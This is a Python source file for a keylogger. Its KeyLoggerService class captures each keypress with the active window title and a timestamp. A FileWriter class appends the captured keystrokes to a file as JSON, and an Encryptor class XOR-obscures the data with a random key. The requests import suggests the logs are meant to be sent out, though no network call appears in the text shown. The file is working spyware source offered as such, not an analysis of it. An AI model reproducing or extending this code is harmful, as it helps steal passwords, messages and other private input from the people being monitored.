import requests,time,ToolBox,pygetwindow,json,random,string
from Interface import IKeyLogger,IKeyLoggerManager,Write
class KeyLoggerService(IKeyLogger):
    def __init__(self):
        self.__logged_keys = {}
        self.__last_record = ""
        self.__last_type_time = None
        self.__last_window = None

    def on_press(self, key) -> None:
        key = ToolBox.format_key(key)
        current_time = time.time()
        current_time_formatted = time.strftime("%d/%m/%Y - %H:%M:%S", time.localtime(current_time))
        active_window = pygetwindow.getActiveWindowTitle()

        if self.__last_type_time is None or current_time - self.__last_type_time >= 2 or active_window != self.__last_window:
            self.__last_record = active_window + ': ' + current_time_formatted

        self.__last_type_time = current_time
        self.__last_window = active_window
        if self.__last_record not in self.__logged_keys:
            self.__logged_keys[self.__last_record] = ""
        self.__logged_keys[self.__last_record] += key

    def get_logged_keys(self) -> dict[str:str]:
        # if len(self.__logged_keys)<1:
        #     return {}
        # return {key:value for key, value in self.__logged_keys.items() if key is not self.__last_record}
        return self.__logged_keys


    def clear_logged_keys(self) -> dict[str:str]:
        self.__logged_keys = {self.__last_record:self.__logged_keys[self.__last_record]} if self.__last_record in self.__logged_keys else {}



class FileWriter(Write):
    def __init__(self,path=None):
        self.path = ToolBox.get_file_path()

    def write(self, data:dict[str:str]) -> bool:
        try:
            with open(self.path,"a",encoding='utf-8') as file:
                convert_data = json.dumps(data)
                file.write(convert_data)
                print(self.path)
                return True
        except IOError:
            return False




class Encryptor:
    def __init__(self):
        self.key = "".join(random.choices(string.ascii_letters + string.digits,k=512))

    def encrypt(self,data:str) -> str:
        ciphertext = ""
        length_key = len(self.key)
        for index in range(len(data)):
            ciphertext += chr(ord(data[index]) ^ ord(self.key[index % length_key]))
        return ciphertext